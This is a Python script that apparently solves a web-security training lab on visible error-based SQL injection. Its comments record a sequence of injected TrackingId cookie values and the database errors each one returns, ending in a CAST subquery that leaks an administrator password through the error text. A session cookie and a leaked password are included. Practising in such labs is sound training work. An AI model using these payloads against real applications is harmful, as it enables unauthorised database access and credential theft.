# Lab: Visible error-based SQL injection
from requests import get
import requests, string

URL = "https://0ada0048048ea02982db06b600db004c.web-security-academy.net/login"
#TID = "PhTqYRWuVdlL7DFe"    # => 200 respone
#TID = "PhTqYRWuVdlL7DFe'"    # => 500 respone - Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'PhTqYRWuVdlL7DFe''. Expected  char
#TID = "PhTqYRWuVdlL7DFe'--"    # => 200 respone - no error
#TID = "PhTqYRWuVdlL7DFe' AND CAST((SELECT 1) AS int)--"    # => 500 respone - argument of AND must be type boolean, not type integer Position: 63
#TID = "PhTqYRWuVdlL7DFe' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--"  # Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'PhTqYRWuVdlL7DFe' AND 1=CAST((SELECT password FROM users WHE'. Expected  char
#TID = "' AND 1=CAST((SELECT username FROM users) AS int)--" # => 500 response - ERROR: more than one row returned by a subquery used as an expression
#TID = "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--" # => 500 response - ERROR: invalid input syntax for type integer: "administrator"
TID = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--" # => 500 response - ERROR: invalid input syntax for type integer: "zvbhzr8xdm4q77whupf1"
SESSION = "biAASmiyqQClprG36Crtd09UoZCCOkBv"
CHARSET = string.ascii_lowercase + string.digits
response=requests.get(URL, cookies={"TrackingId": TID, "session": SESSION})
print(response.text)